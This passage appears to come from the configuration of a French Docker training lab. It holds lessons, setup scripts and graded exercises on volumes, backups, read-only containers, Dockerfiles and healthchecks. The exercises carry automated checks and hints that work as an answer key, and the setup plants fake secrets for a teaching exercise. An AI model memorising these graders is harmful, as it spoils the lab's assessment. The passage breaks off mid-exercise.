        "lesson": """<h3>Volume nommé ou bind mount : qui gagne ?</h3><p>Quand on monte quelque chose sur un dossier qui <strong>contient déjà des fichiers dans l'image</strong>, le résultat dépend du type de montage :</p><ul><li><strong>Bind mount</strong> (<code>-v /chemin/hote:/dossier</code>) : le dossier de l'hôte <strong>masque</strong> celui de l'image. Dossier vide ⇒ le conteneur voit un dossier vide.</li><li><strong>Volume nommé vide</strong> (<code>-v mon-volume:/dossier</code>) : au premier montage, Docker <strong>recopie</strong> le contenu de l'image dans le volume. Ensuite, le volume a sa vie propre : il n'est plus jamais rempli à nouveau depuis une image.</li></ul><pre>docker run -d --name demo -v demo-conf:/etc/nginx/conf.d nginx:alpine   # le volume reçoit default.conf<br>docker cp maintenance.conf demo:/etc/nginx/conf.d/                     # docker cp écrit aussi dans le volume</pre><h3>Restaurer une sauvegarde</h3><p>L'opération inverse de la sauvegarde, <strong>avant</strong> de démarrer le service : sinon il travaille sur un volume vide, puis écrase ou ignore les fichiers restaurés.</p><pre>docker volume create donnees-demo<br>docker run --rm -v donnees-demo:/data -v ~/archives:/backup alpine \\<br>  tar xzf /backup/demo.tar.gz -C /data<br>docker run -d --name … -v donnees-demo:/data …</pre><h3>Les volumes anonymes</h3><p>Certaines images déclarent un <code>VOLUME</code> dans leur Dockerfile (Redis : <code>VOLUME /data</code>). Sans <code>-v</code>, chaque <code>docker run</code> crée alors un <strong>volume anonyme</strong> (un nom de 64 caractères hexadécimaux)… qui <strong>survit</strong> à <code>docker rm</code>.</p><pre>docker image inspect -f '{{.Config.Volumes}}' redis:7-alpine<br>docker volume ls -f dangling=true      # volumes qu'aucun conteneur, même arrêté, n'utilise<br>docker rm -v conteneur                 # supprime le conteneur ET ses volumes anonymes<br>docker volume prune                    # supprime les volumes ANONYMES inutilisés<br>docker volume prune -a                 # … et aussi les volumes NOMMÉS inutilisés (danger)</pre><div class="tip"><code>docker run --rm</code> supprime aussi les volumes anonymes du conteneur ; jamais les volumes nommés.</div><h3>Labels et filtres</h3><p>Un volume peut porter des labels, posés à sa création (<code>docker volume create --label equipe=compta archives</code>). <code>docker volume ls</code> et <code>docker volume prune</code> acceptent des filtres : <code>dangling=true</code>, <code>name=…</code>, <code>label=cle</code>, <code>label=cle=valeur</code>, et leur négation <code>label!=…</code>. Listez toujours avant de supprimer.</p><h3>Un conteneur en lecture seule</h3><p><code>--read-only</code> interdit toute écriture dans le système de fichiers du conteneur : impossible de modifier un programme ou une configuration de l'image. Les dossiers où l'application doit vraiment écrire (cache, fichier PID…) reçoivent un <strong>tmpfs</strong> : un petit système de fichiers en mémoire, vidé à l'arrêt. Un tmpfs reste inscriptible : on les limite au strict nécessaire.</p><pre>docker run -d --read-only --tmpfs /tmp nginx:alpine<br>docker logs conteneur        # « Read-only file system » : quel dossier manque ?<br>docker exec conteneur mount  # les montages, et leurs OPTIONS</pre><p>Un tmpfs accepte des options de montage après le chemin : <code>--tmpfs /cache:size=16m,mode=1777</code>.</p><h3>Les trois types de montage</h3><pre>-v volume:/chemin          --mount type=volume,src=volume,dst=/chemin<br>-v /hote:/chemin:ro        --mount type=bind,src=/hote,dst=/chemin,readonly<br>--tmpfs /chemin            --mount type=tmpfs,dst=/chemin</pre>""",
        "setup": r'''
images_de_base
arreter_jour 3
arreter vitrine vitrine-site vitrine-promo admin-console maintenance intranet
ids=$(docker ps -q --filter publish=8087); [ -z "$ids" ] || arreter $ids
L="--label lab.jour=5"
# Le site « disparu » de Thomas : un dossier vide monté par-dessus celui de nginx
mkdir -p $P/vide
own $P
docker rm -f vitrine-vide >/dev/null 2>&1 || true
docker run -d --name vitrine-vide $L -p 8085:80 -v $P/vide:/usr/share/nginx/html nginx:alpine >/dev/null
# Sauvegarde du cache faite avant la migration (clé promo aléatoire, et 40 fiches clients)
promo=$(rword | tr 'a-z-' 'A-Z_')
mkdir -p $H/sauvegardes
docker rm -f lab-prep-cache >/dev/null 2>&1 || true
docker volume rm lab-prep-cache >/dev/null 2>&1 || true
docker run -d --name lab-prep-cache -v lab-prep-cache:/data redis:7-alpine redis-server --appendonly yes >/dev/null
attendre_redis lab-prep-cache
docker exec lab-prep-cache redis-cli set promo "$promo" >/dev/null
for i in $(seq 1 40); do echo "SET client:$i $(hexa 3)"; done | docker exec -i lab-prep-cache redis-cli >/dev/null
k=$((RANDOM % 40 + 1))
emit CLIENT "client:$k $(docker exec lab-prep-cache redis-cli get client:$k)"
docker exec lab-prep-cache redis-cli save >/dev/null
docker rm -f lab-prep-cache >/dev/null
docker run --rm -v lab-prep-cache:/data -v $H/sauvegardes:/backup alpine tar czf /backup/cache-avant-migration.tar.gz -C /data .
docker volume rm lab-prep-cache >/dev/null
own $H/sauvegardes
# Volumes anonymes laissés par des conteneurs Redis supprimés, et un volume nommé inutilisé mais précieux
docker volume create --label conserver=oui archives-2023 >/dev/null
docker run --rm -v archives-2023:/archives alpine sh -c 'echo "Grand livre 2023" > /archives/grand-livre-2023.txt'
for _ in 1 2 3 4; do docker rm "$(docker create redis:7-alpine)" >/dev/null; done
emit PROMO "$promo"
# D5.5 : deux versions d'un site livré dans l'image, et un volume monté par-dessus
docker rm -f vitrine-maison >/dev/null 2>&1 || true
docker volume rm html-maison >/dev/null 2>&1 || true
j1="V1-$(hexa 3)"; j2="V2-$(hexa 3)"
t=$(mktemp -d); printf 'FROM nginx:alpine\nCOPY index.html /usr/share/nginx/html/index.html\n' > $t/Dockerfile
printf '<h1>Maison Cimes &amp; Sentiers</h1>\n<p>Collection de printemps (%s)</p>\n' "$j1" > $t/index.html
docker build -q -t vitrine-maison:1 $t >/dev/null
printf '<h1>Maison Cimes &amp; Sentiers</h1>\n<p>Nouvelle collection d’été (%s)</p>\n' "$j2" > $t/index.html
docker build -q -t vitrine-maison:2 $t >/dev/null
rm -rf $t
docker run -d --name vitrine-maison $L -p 8092:80 -v html-maison:/usr/share/nginx/html vitrine-maison:1 >/dev/null
docker rm -f vitrine-maison >/dev/null
docker run -d --name vitrine-maison $L -p 8092:80 -v html-maison:/usr/share/nginx/html vitrine-maison:2 >/dev/null
emit V2 "$j2"
# D5.6 : un outil qui génère puis exécute un script dans /work
docker rm -f compilateur >/dev/null 2>&1 || true
docker build -q -t compilateur:1 /opt/docker-lab/fabrique/compilateur >/dev/null
# D5.7 : des volumes nommés, utilisés ou non, étiquetés ou non
nettoyer D5.7
for v in $(docker volume ls -q -f label=lab.exercice=D5.7); do docker volume rm "$v" >/dev/null 2>&1 || true; done
vol() { local n; n="$1-$(rword)"; docker volume create --label lab.exercice=D5.7 $2 "$n" >/dev/null; echo "$n"; }
a=$(vol commandes); b=$(vol factures)
docker create --name "job-$(rword)" --label lab.exercice=D5.7 -v $a:/data alpine true >/dev/null
docker create --name "job-$(rword)" --label lab.exercice=D5.7 -v $b:/data alpine true >/dev/null
c=$(vol bilans "--label conserver=oui"); d=$(vol contrats "--label conserver=oui")
e=$(vol essais); f=$(vol brouillons)
emit VGARDER "$a $b $c $d"
emit VSUPPR "$e $f"
''',
        "exercises": [
            {"id": "D5.1", "points": 4, "title": "Le site a disparu",
             "ticket": {"from": "thomas", "body": "Je ne comprends pas : j'ai lancé <code>vitrine-vide</code> en montant un dossier vide sur <code>/usr/share/nginx/html</code>, et nginx répond 403 (<code>curl localhost:8085</code>) ! Je voulais garder la page d'accueil de nginx et juste y ajouter une page. Fais-moi une <code>vitrine-pleine</code> sur le port <strong>8082</strong> dont les pages sont dans un <strong>volume</strong> <code>html-vitrine</code> qui garde la page de nginx, et ajoutes-y <code>promo.html</code> avec « Soldes d'été »."},
             "desc": "Le conteneur <code>vitrine-pleine</code> (nginx:alpine) monte le volume <code>html-vitrine</code> sur <code>/usr/share/nginx/html</code>, sert la page d'accueil de nginx sur le port 8082, ainsi que <code>/promo.html</code> contenant « Soldes ».",
             "hints": ["Bind mount ou volume nommé : lequel masque le contenu de l'image, lequel le recopie ? À quelle condition ?",
                       "Un volume nommé <strong>neuf</strong> (donc vide) monté sur <code>/usr/share/nginx/html</code>, puis <code>docker cp</code> de votre page dans le conteneur."],
             "checks": [
                 ('docker volume inspect html-vitrine', "Le volume html-vitrine n'existe pas."),
                 ('running vitrine-pleine', "Le conteneur vitrine-pleine ne tourne pas."),
                 ('insp vitrine-pleine "{{range .Mounts}}{{.Type}} {{.Name}} {{.Destination}}{{println}}{{end}}" | grep -qx "volume html-vitrine /usr/share/nginx/html"', "Le volume html-vitrine doit être monté sur /usr/share/nginx/html dans vitrine-pleine."),
                 ('http 8082 / | grep -q "Welcome to nginx"', "http://localhost:8082 ne sert pas la page d'accueil de nginx : le volume était-il vide au premier montage ?"),
                 ('http 8082 /promo.html | grep -q "Soldes"', "http://localhost:8082/promo.html ne contient pas « Soldes »."),
             ]},
            {"id": "D5.2", "points": 4, "title": "Restaurer le cache",
             "ticket": {"from": "sophie", "body": "Avant la migration, Léa a sauvegardé le cache Redis dans <code>~/sauvegardes/cache-avant-migration.tar.gz</code>. Restaure-le dans un nouveau volume <code>donnees-restaurees</code>, et démarre dessus un Redis nommé <code>cache-restaure</code>. Je veux retrouver la clé <code>promo</code> et les fiches clients telles qu'elles étaient."},
             "desc": "Le conteneur <code>cache-restaure</code> (redis:7-alpine) monte le volume <code>donnees-restaurees</code> sur <code>/data</code>, et contient exactement les données de la sauvegarde.",
             "hints": ["Un conteneur jetable qui monte le volume et <code>~/sauvegardes</code> peut extraire l'archive. À quel moment Redis lit-il ses fichiers ?",
                       "Restaurez <strong>avant</strong> de démarrer Redis. S'il tourne déjà sur le volume : <code>docker rm -f cache-restaure</code>, restauration, puis nouveau <code>docker run</code>."],
             "checks": [
                 ('running cache-restaure', "Le conteneur cache-restaure ne tourne pas."),
                 ('insp cache-restaure "{{range .Mounts}}{{.Type}} {{.Name}} {{.Destination}}{{println}}{{end}}" | grep -qx "volume donnees-restaurees /data"', "Le volume donnees-restaurees doit être monté sur /data dans cache-restaure."),
                 ('[ "$(docker exec cache-restaure redis-cli get promo)" = "$LAB_PROMO" ]', "La clé promo de cache-restaure n'a pas la valeur de la sauvegarde (archive extraite dans le volume avant le démarrage de Redis ?)."),
                 ('[ "$(docker exec cache-restaure redis-cli dbsize)" = 41 ] && set -- $LAB_CLIENT && [ "$(docker exec cache-restaure redis-cli get $1)" = "$2" ]', "cache-restaure ne contient pas toutes les données de la sauvegarde (41 clés) : restaurez l'archive, ne recréez pas les clés à la main."),
             ]},
            {"id": "D5.3", "points": 3, "title": "Des volumes fantômes",
             "ticket": {"from": "lea", "body": "<code>docker volume ls</code> est plein de volumes aux noms illisibles : des volumes <strong>anonymes</strong> laissés par des conteneurs Redis supprimés. Fais le ménage. Attention : <code>archives-2023</code> ne sert à aucun conteneur, mais il contient le grand livre comptable. Il doit rester !"},
             "desc": "Plus aucun volume anonyme inutilisé ; le volume <code>archives-2023</code> existe toujours.",
             "hints": ["Listez d'abord les volumes qu'aucun conteneur n'utilise. Parmi eux, lesquels sont anonymes ?",
                       "Relisez la différence entre <code>docker volume prune</code> et <code>docker volume prune -a</code>."],
             "checks": [
                 ('docker volume inspect archives-2023', "Le volume archives-2023 a été supprimé ! (docker volume prune -a supprime aussi les volumes nommés inutilisés ; bouton « Réinitialiser les fichiers de cette étape » pour le recréer)"),
                 ('[ -z "$(docker volume ls -q -f dangling=true | grep -E "^[0-9a-f]{64}$")" ]', "Il reste des volumes anonymes inutilisés (docker volume ls -f dangling=true)."),
             ]},
            {"id": "D5.4", "points": 4, "title": "Une vitrine en lecture seule",
             "ticket": {"from": "sophie", "body": "Suite à l'audit de sécurité : si quelqu'un pénètre dans le serveur web, il ne doit pouvoir modifier <strong>aucun</strong> fichier de l'image. Lance <code>vitrine-ro</code> (nginx:alpine, port <strong>8083</strong>) avec un système de fichiers en lecture seule. Et il doit quand même fonctionner…"},
             "desc": "Le conteneur <code>vitrine-ro</code> a un système de fichiers en lecture seule (<code>--read-only</code>), répond sur <code>http://localhost:8083</code>, et on ne peut pas écrire dans <code>/usr/share/nginx/html</code>.",
             "hints": ["Essayez d'abord avec <code>--read-only</code> seul, puis lisez <code>docker logs vitrine-ro</code> : que nginx veut-il écrire, et où ?",
                       "Chaque dossier où nginx doit écrire (son cache, le dossier de son fichier PID) reçoit son propre <code>--tmpfs</code>. Supprimez et relancez le conteneur à chaque essai."],
             "checks": [
                 ('running vitrine-ro', "Le conteneur vitrine-ro ne tourne pas (docker logs vitrine-ro)."),
                 ('[ "$(insp vitrine-ro "{{.HostConfig.ReadonlyRootfs}}")" = true ]', "Le système de fichiers de vitrine-ro doit être en lecture seule (--read-only)."),
                 ('http 8083 / | grep -q "Welcome to nginx"', "vitrine-ro ne sert pas la page de nginx sur http://localhost:8083."),
                 ('! docker exec vitrine-ro touch /usr/share/nginx/html/pirate.html 2>/dev/null', "On peut encore écrire dans /usr/share/nginx/html de vitrine-ro."),
             ]},
            {"id": "D5.5", "points": 5, "title": "J'ai livré la v2, le site affiche la v1",
             "ticket": {"from": "thomas", "body": "J'ai livré la nouvelle collection : image <code>vitrine-maison:2</code>, et j'ai recréé le conteneur <code>vitrine-maison</code> (port 8092) dessus. Vérifie : il tourne bien sur la v2 ! Et pourtant le site affiche toujours la collection de printemps. Répare, et fais en sorte que la v3 s'affiche la semaine prochaine sans que j'aie à t'appeler."},
             "desc": "<code>vitrine-maison</code> tourne sur <code>vitrine-maison:2</code>, sert la nouvelle collection sur le port 8092, et plus rien n'est monté par-dessus le site livré dans l'image.",
             "hints": ["Qu'est-ce qui est servi : le contenu de l'image, ou celui de quelque chose monté par-dessus ? Et quand ce quelque chose a-t-il été rempli ?",
                       "Le volume <code>html-maison</code> a été rempli par la v1, au premier montage, et ne l'est plus jamais ensuite. Si le contenu vient de l'image, ne montez rien sur <code>/usr/share/nginx/html</code> (conteneur à recréer ; le volume, devenu inutile, peut être supprimé)."],
             "checks": [
                 ('running vitrine-maison && [ "$(insp vitrine-maison "{{.Image}}")" = "$(id_img vitrine-maison:2)" ]', "vitrine-maison doit tourner sur l'image vitrine-maison:2."),
                 ('http 8092 / | grep -q "$LAB_V2"', "http://localhost:8092 ne sert pas la nouvelle collection (v2)."),
                 ('! insp vitrine-maison "{{range .Mounts}}{{.Destination}}{{println}}{{end}}" | grep -qx /usr/share/nginx/html', "Un volume (ou un dossier) est encore monté sur /usr/share/nginx/html : la v3 aura le même problème."),
             ]},
            {"id": "D5.6", "points": 4, "title": "Permission denied dans le tmpfs",
             "ticket": {"from": "nadia", "body": "L'outil <code>compilateur:1</code> doit, lui aussi, tourner en lecture seule. Il génère un script dans <code>/work</code>, puis l'exécute. J'ai ajouté un tmpfs sur <code>/work</code>, et maintenant j'ai « Permission denied » ! Lance un conteneur <code>compilateur</code>, en lecture seule, qui aille au bout (il affiche <code>OK-…</code>). Pas de volume : la zone de travail doit disparaître à l'arrêt."},
             "desc": "Le conteneur <code>compilateur</code>, lancé depuis <code>compilateur:1</code> avec sa commande par défaut et un système de fichiers en lecture seule, a affiché <code>OK-…</code> ; <code>/work</code> est un tmpfs.",
             "hints": ["Le script est bien écrit, mais son exécution est refusée. Regardez les options de montage de <code>/work</code> (<code>docker run --rm --read-only --tmpfs /work compilateur:1 mount</code>).",
                       "Docker monte les tmpfs en <code>noexec</code> par défaut. Une option de montage, ajoutée après le chemin (<code>--tmpfs /work:…</code>), autorise l'exécution."],
             "checks": [
                 ('docker inspect compilateur && [ "$(insp compilateur "{{.Config.Image}}")" = compilateur:1 ]', "Aucun conteneur compilateur créé depuis l'image compilateur:1."),
                 ('[ "$(insp compilateur "{{.HostConfig.ReadonlyRootfs}}")" = true ]', "Le conteneur compilateur doit avoir un système de fichiers en lecture seule (--read-only)."),
                 ('[ "$(insp compilateur "{{json .Config.Cmd}}{{json .Config.Entrypoint}}")" = "$(docker image inspect -f "{{json .Config.Cmd}}{{json .Config.Entrypoint}}" compilateur:1)" ]', "Le conteneur compilateur doit lancer la commande par défaut de l'image."),
                 ('! insp compilateur "{{range .Mounts}}{{.Type}} {{.Destination}}{{println}}{{end}}" | grep -Eqx "(volume|bind) /work"', "/work ne doit pas être un volume ni un dossier de l'hôte : la zone de travail doit disparaître à l'arrêt (tmpfs)."),
                 ('docker logs compilateur 2>&1 | grep -qx "OK-$(insp compilateur "{{.Config.Hostname}}")"', "Le conteneur compilateur n'a pas affiché OK-… : lisez docker logs compilateur."),
             ]},
            {"id": "D5.7", "points": 4, "title": "Le ménage sous étiquettes",
             "ticket": {"from": "sophie", "body": "Encore du ménage : supprime les volumes nommés qu'<strong>aucun</strong> conteneur n'utilise (même arrêté), sauf ceux qui portent le label <code>conserver=oui</code> : obligations légales. Et tu ne supprimes aucun conteneur."},
             "desc": "Les volumes nommés inutilisés sans le label <code>conserver=oui</code> ont disparu ; les volumes étiquetés <code>conserver=oui</code> et ceux utilisés par un conteneur existent toujours.",
             "hints": ["Quels volumes sont inutilisés, et quels labels portent-ils ? <code>docker volume ls</code> sait filtrer, et <code>docker volume inspect</code> affiche les labels.",
                       "<code>docker volume prune -a</code> accepte des filtres, y compris une négation : <code>--filter 'label!=conserver=oui'</code>. Ou supprimez-les un par un, après vérification."],
             "checks": [
                 ('for v in $LAB_VGARDER archives-2023; do docker volume inspect "$v" >/dev/null 2>&1 || { echo "MSG:volume $v"; exit 1; }; done', "Un volume utilisé par un conteneur, ou étiqueté conserver=oui, a été supprimé ! (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)"),
                 ('[ "$(docker ps -aq --filter label=lab.exercice=D5.7 | wc -l)" = 2 ]', "Un conteneur a été supprimé : il ne fallait supprimer que des volumes."),
                 ('for v in $LAB_VSUPPR; do ! docker volume inspect "$v" >/dev/null 2>&1 || exit 1; done', "Il reste des volumes nommés inutilisés sans le label conserver=oui."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    6: {
        "title": "Jour 6 — Le Dockerfile de l'API",
        "description": "Construire sa propre image. Compétences : FROM, WORKDIR, COPY, EXPOSE, CMD, USER, .dockerignore, HEALTHCHECK, politiques de redémarrage, Dockerfile plutôt que docker commit.",
        "lesson": """<h3>Un Dockerfile</h3><pre>FROM node:20-alpine            # image de départ<br>WORKDIR /srv/outil             # dossier de travail (créé si besoin)<br>COPY . .                       # copie le contexte dans l'image<br>RUN chmod +x bin/*.sh          # commande exécutée PENDANT la construction<br>EXPOSE 8000                    # documente le port écouté<br>CMD ["node", "index.js"]       # commande lancée au démarrage du conteneur</pre><pre>docker build -t outil:1.0 ~/outil      # construit l'image (le dernier argument = le contexte)<br>docker run -d --name outil -p 8000:8000 outil:1.0<br>docker history outil:1.0               # les couches de l'image</pre><ul><li><code>USER &lt;utilisateur&gt;</code> : les instructions suivantes, et le conteneur, s'exécutent sous cet utilisateur au lieu de root. L'image node fournit l'utilisateur <code>node</code>.</li><li>Chaque instruction crée une <strong>couche</strong>. Si rien n'a changé, Docker réutilise la couche du cache.</li></ul><h3>Le contexte et .dockerignore</h3><p>Le <strong>contexte</strong> est le dossier donné à <code>docker build</code> : tout ce que <code>COPY</code> peut copier. <code>COPY . .</code> copie tout ce qu'il contient. Un fichier <code>.dockerignore</code>, à la racine du contexte, exclut ce qui n'a rien à faire dans l'image (un motif par ligne) :</p><pre>.git<br>*.log<br>tmp/</pre><div class="tip">Un secret copié dans une image est lisible par quiconque récupère l'image, même si on le supprime dans une couche suivante.</div><h3>HEALTHCHECK : l'état de santé</h3><p>Un conteneur qui tourne n'est pas forcément un service qui répond. <code>HEALTHCHECK</code> indique une commande, exécutée régulièrement <strong>dans</strong> le conteneur : code 0 = en bonne santé.</p><pre>HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD wget -q --spider http://localhost/ || exit 1<br><br>docker ps                                         # STATUS : (healthy), (unhealthy), (health: starting)<br>docker inspect -f '{{json .State.Health}}' conteneur</pre><div class="tip">La commande du test doit exister dans l'image : les images Alpine ont <code>wget</code> (BusyBox), pas <code>curl</code>.</div><h3>Politiques de redémarrage</h3><ul><li><code>--restart no</code> (par défaut) : jamais ;</li><li><code>--restart on-failure[:N]</code> : seulement si le processus se termine avec un code différent de 0, N fois au plus ;</li><li><code>--restart always</code> : toujours, y compris au redémarrage du moteur ;</li><li><code>--restart unless-stopped</code> : comme <code>always</code>, sauf si on l'a arrêté volontairement.</li></ul><p>Un conteneur qui plante en boucle apparaît « Restarting (code) » dans <code>docker ps</code> ; Docker espace de plus en plus les tentatives. <code>docker inspect -f '{{.RestartCount}}'</code> compte les redémarrages.</p><h3>docker commit : à éviter</h3><p><code>docker commit conteneur image</code> fige l'état d'un conteneur en image. Pratique pour dépanner, mais personne ne sait refaire cette image ni ce qu'elle contient vraiment. Une image se décrit dans un <strong>Dockerfile</strong> : une recette versionnée et reproductible.</p>""",
        "setup": r'''
images_de_base
livrer api
arreter_jour 4
arreter cache stock
secret="sk_live_$(rword | tr -d '-')$RANDOM"
printf 'STRIPE_SECRET_KEY=%s\nDB_PASSWORD=Sup3rS3cret!\n' "$secret" > $P/api/.env
mkdir -p $P/api/node_modules/module-lourd
[ -f $P/api/node_modules/module-lourd/blob.bin ] || head -c 25M /dev/urandom > $P/api/node_modules/module-lourd/blob.bin
own $P/api
emit SECRET "$secret"
L="--label lab.jour=6"
# D6.4 : un service qui plante en boucle, faute de configuration
docker rm -f synchro >/dev/null 2>&1 || true
docker build -q -t synchro-stock:1.0 /opt/docker-lab/fabrique/synchro >/dev/null
mkdir -p $P/synchro
conf="entrepot=$(rword)"
echo "$conf" > $P/synchro/stock.conf
own $P/synchro
docker run -d --name synchro $L --restart always synchro-stock:1.0 >/dev/null
emit SYNCHRO "$conf"
# D6.6 : l'outil de rapport « installé » à la main par Marc dans un conteneur
docker rm -f bricolage-marc >/dev/null 2>&1 || true
docker run -d --name bricolage-marc $L alpine sleep infinity >/dev/null
t=$(mktemp -d)
printf 'SITE=entrepot-%s\nEDITION=%s\n' "$(rword | cut -d- -f1)" "$((RANDOM % 90 + 10))" > $t/rapport.conf
cat > $t/rapport.sh <<'EOF'
#!/bin/sh
. /etc/rapport.conf
echo "Rapport des ventes ($SITE), édition $EDITION"
EOF
chmod 755 $t/rapport.sh
docker cp $t/rapport.conf bricolage-marc:/etc/rapport.conf >/dev/null
docker cp $t/rapport.sh bricolage-marc:/usr/local/bin/rapport.sh >/dev/null
rm -rf $t
docker exec bricolage-marc sh -c 'echo "vi /etc/rapport.conf" > /root/.ash_history; echo essai > /tmp/essai.txt'
emit RAPPORT "$(docker exec bricolage-marc rapport.sh)"
docker stop -t 1 bricolage-marc >/dev/null
mkdir -p $P/rapport
own $P/rapport
''',
        "exercises": [
            {"id": "D6.1", "points": 5, "title": "L'image de l'API", "manual": True,
             "ticket": {"from": "thomas", "body": "L'API de la boutique (<code>~/projet/api</code>, Node 20, point d'entrée <code>server.js</code>, port 3000) doit tourner partout pareil. Écris son <code>Dockerfile</code>, à partir de l'image <code>node:20-alpine</code>, et construis l'image <code>boutique-api:1.0</code>."},
             "desc": "<code>~/projet/api/Dockerfile</code> construit une image <code>boutique-api:1.0</code> basée sur <code>node:20-alpine</code>, qui expose le port 3000 et dont l'API répond sur <code>/health</code>.",
             "hints": ["Quatre questions : de quelle image partir, où mettre le code dans l'image, quel port est écouté, et quelle commande lancer au démarrage ?",
                       "<code>FROM</code>, <code>WORKDIR</code>, <code>COPY</code>, <code>EXPOSE</code>, <code>CMD</code> (forme JSON). Puis <code>docker build -t nom:tag contexte</code>."],
             "checks": [
                 ('test -f $P/api/Dockerfile', "~/projet/api/Dockerfile n'existe pas."),
                 ('grep -qiE "^FROM +node:20-alpine( |$)" $P/api/Dockerfile', "Le Dockerfile doit partir de l'image node:20-alpine (FROM)."),
                 ('docker build -q -t lab-verif-api $P/api && docker rmi lab-verif-api', "Le Dockerfile ne se construit pas : lancez docker build pour voir l'erreur."),
                 ('docker image inspect boutique-api:1.0', "L'image boutique-api:1.0 n'existe pas (option -t de docker build)."),
                 ('insp boutique-api:1.0 "{{json .Config.ExposedPorts}}" | grep -q "3000/tcp"', "L'image doit exposer le port 3000 (EXPOSE)."),
                 ('verif lab-verif; docker run -d --name lab-verif boutique-api:1.0 >/dev/null && attendre_http lab-verif 3000 /health 8 | grep -q ok; r=$?; verif lab-verif; [ $r = 0 ]', "Un conteneur lancé depuis boutique-api:1.0 ne répond pas sur /health (vérifiez CMD et le port)."),
             ]},
            {"id": "D6.2", "points": 3, "title": "L'API en service",
             "ticket": {"from": "sophie", "body": "Mets l'API en service : un conteneur <code>api</code> sur le port 3000 de la machine, qui redémarre tout seul s'il plante ou si le serveur redémarre, sauf si on l'a arrêté volontairement."},
             "desc": "Un conteneur <code>api</code> issu de <code>boutique-api:1.0</code>, publié sur le port 3000, avec la politique de redémarrage adaptée.",
             "hints": ["Relisez les quatre politiques de redémarrage du cours : laquelle respecte « sauf si on l'a arrêté volontairement » ?",
                       "<code>--restart unless-stopped</code>, sur un conteneur créé depuis <code>boutique-api:1.0</code> qui publie le port 3000."],
             "checks": [
                 ('running api', "Le conteneur api ne tourne pas."),
                 ('[ "$(insp api "{{.Config.Image}}")" = boutique-api:1.0 ]', "Le conteneur api doit être créé depuis l'image boutique-api:1.0."),
                 ('http 3000 /produits | grep -q "SAC-40L"', "http://localhost:3000/produits ne renvoie pas le catalogue."),
                 ('[ "$(insp api "{{.HostConfig.RestartPolicy.Name}}")" = unless-stopped ]', "La politique de redémarrage ne correspond pas : l'api doit redémarrer après un plantage ou un redémarrage du serveur, sauf si on l'a arrêtée volontairement."),
             ]},
            {"id": "D6.3", "points": 5, "title": "Une image propre", "manual": True,
             "ticket": {"from": "nadia", "body": "Revue de ton image : je parie qu'elle embarque <code>node_modules</code> (25 Mo inutiles) et… le fichier <code>.env</code> avec la clé Stripe de production ! Vérifie aussi qu'elle ne tourne pas en <code>root</code>. Corrige le Dockerfile (et ajoute ce qu'il faut à côté), reconstruis <code>boutique-api:1.0</code>, et remets le conteneur <code>api</code> en service sur la nouvelle image."},
             "desc": "Construite depuis <code>~/projet/api</code>, l'image ne contient ni <code>.env</code> ni <code>node_modules</code> ; <code>boutique-api:1.0</code> est reconstruite, ne s'exécute pas en root, et le conteneur <code>api</code> l'utilise.",
             "hints": ["Qu'y a-t-il dans l'image ? <code>docker run --rm --entrypoint ls boutique-api:1.0 -la</code>. Et quel utilisateur l'API annonce-t-elle sur <code>/health</code> ?",
                       "Un <code>.dockerignore</code> à côté du Dockerfile (ou des <code>COPY</code> qui ne copient que le nécessaire) ; <code>USER node</code>. Un conteneur garde son image : recréez <code>api</code>."],
             "checks": [
                 ('docker build -q -t lab-verif-propre $P/api >/dev/null', "Le Dockerfile de ~/projet/api ne se construit pas."),
                 ('r=$(docker run --rm --entrypoint sh lab-verif-propre -c "find / -xdev \\( -name .env -o -name blob.bin \\) 2>/dev/null"); docker rmi lab-verif-propre >/dev/null 2>&1; [ -z "$r" ]', "Construite depuis ~/projet/api, l'image contient encore .env ou node_modules : excluez-les du contexte de construction."),
                 ('r=$(docker run --rm --entrypoint sh boutique-api:1.0 -c "find / -xdev \\( -name .env -o -name blob.bin \\) 2>/dev/null"); [ -z "$r" ]', "L'image boutique-api:1.0 contient encore .env ou node_modules : reconstruisez-la."),
                 ('[ "$(docker run --rm --entrypoint whoami boutique-api:1.0)" != root ]', "L'application s'exécute encore en root (instruction USER)."),
                 ('running api && [ "$(insp api "{{.Image}}")" = "$(id_img boutique-api:1.0)" ]', "Le conteneur api n'utilise pas la nouvelle image boutique-api:1.0 : un conteneur garde l'image avec laquelle il a été créé."),
                 ('http 3000 /health | jq -e ".utilisateur != \\"root\\""', "Le conteneur api répond en tant que root sur /health."),
             ]},
            {"id": "D6.4", "points": 5, "title": "Crash en boucle",
             "ticket": {"from": "sophie", "body": "Le conteneur <code>synchro</code> (image <code>synchro-stock:1.0</code>) redémarre en permanence et remplit les journaux. Trouve pourquoi et corrige : sa configuration est prête dans <code>~/projet/synchro</code>. Et plus jamais de boucle infinie : s'il plante, 5 tentatives au maximum, puis on le laisse arrêté."},
             "desc": "<code>synchro</code> (image <code>synchro-stock:1.0</code>) tourne, a lu la configuration de <code>~/projet/synchro/stock.conf</code>, et ne redémarre qu'en cas d'échec, 5 fois au plus.",
             "hints": ["<code>docker ps</code> affiche « Restarting (3) » : que signifie ce 3 ? Lisez <code>docker logs synchro</code> : que cherche le programme, et où ?",
                       "Fournissez le dossier de configuration par un bind mount (lecture seule), avec la politique <code>on-failure</code> et un nombre maximal de tentatives. Le conteneur est à recréer."],
             "checks": [
                 ('[ "$(insp synchro "{{.State.Status}}")" = running ] && [ "$(insp synchro "{{.Config.Image}}")" = synchro-stock:1.0 ]', "synchro (image synchro-stock:1.0) ne tourne pas normalement : lisez docker logs synchro."),
                 ('docker logs synchro 2>/dev/null | grep -qx "Synchro OK : $LAB_SYNCHRO"', "synchro n'a pas lu la configuration de ~/projet/synchro/stock.conf."),
                 ('[ "$(insp synchro "{{.HostConfig.RestartPolicy.Name}}:{{.HostConfig.RestartPolicy.MaximumRetryCount}}")" = on-failure:5 ]', "synchro doit redémarrer seulement en cas d'échec, et 5 fois au plus."),
             ]},
            {"id": "D6.5", "points": 4, "title": "L'état de santé dans l'image", "manual": True,
             "ticket": {"from": "nadia", "body": "Je veux que <code>docker ps</code> affiche l'état de santé de l'API partout où elle tourne, sans rien ajouter au lancement : la vérification doit être <strong>dans l'image</strong> <code>boutique-api:1.0</code>. Une API qui ne répond plus sur <code>/health</code> doit apparaître <em>unhealthy</em>."},
             "desc": "L'image <code>boutique-api:1.0</code> a un HEALTHCHECK : un conteneur de l'API devient <em>healthy</em>, un conteneur dont l'API ne répond pas devient <em>unhealthy</em>.",
